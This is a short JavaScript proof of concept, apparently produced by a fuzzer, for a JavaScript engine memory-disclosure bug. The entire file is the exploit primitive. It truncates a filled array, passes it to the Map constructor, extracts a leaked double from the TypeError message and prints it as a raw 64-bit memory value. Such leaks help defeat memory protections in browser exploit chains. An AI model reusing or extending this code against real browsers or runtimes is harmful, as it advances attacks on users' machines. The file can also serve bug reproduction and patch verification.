const v0 = (a1) => {
    const v4 = new ArrayBuffer(8);
    let buf = v4;
    const v7 = new Float64Array(buf);
    let farr = v7;
    const v10 = new Uint32Array(buf);
    let iarr = v10;
    farr[0] = a1;
    let d = (iarr[1] * 4294967296) + iarr[0];
    return d;
};
const double2int = v0;
try {
    const v21 = new Array(10);
    let iterable = v21;
    for (let i24 = 0; i24 < 10; i24++) {
        iterable[i24] = 123.123;
    }
    iterable.length = 0;
    new Map(iterable);
} catch(e34) {
    console.log(e34);
    let regex = /TypeError: Iterator value ([0-9\.e\-]+) is not an entry object/;
    let val = parseFloat(regex.exec(e34)[1]);
    console.log(`Memory Value: ${double2int(val).toString(16)}`);
}
